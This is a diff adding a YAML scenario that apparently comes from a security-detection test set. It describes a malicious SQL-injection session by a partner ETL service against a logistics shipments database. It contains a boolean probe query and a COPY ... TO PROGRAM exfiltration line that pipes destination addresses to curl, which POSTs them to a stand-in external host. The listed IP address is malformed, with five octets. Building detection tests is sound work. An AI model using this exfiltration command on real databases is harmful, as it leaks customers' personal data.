@@ -1,0 +1,33 @@
+scenario_id: gen_logistics_23_sql_injection_mal_553m
+family_id: gen_logistics_23_sql_injection_fam_553
+domain: logistics
+time_of_day: 01:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT shipment_id, status FROM shipments WHERE shipment_id = 783689 AND
+      (SELECT count(*) FROM shipments) > 0
+  - step_id: exfil
+    sql: COPY (SELECT dest_address FROM shipments) TO PROGRAM 'curl -sX POST https://warehouse-sync.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 91.219.236.190.252
+      port: 443
+matched_pair_id: gen_logistics_23_sql_injection_pair_553
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
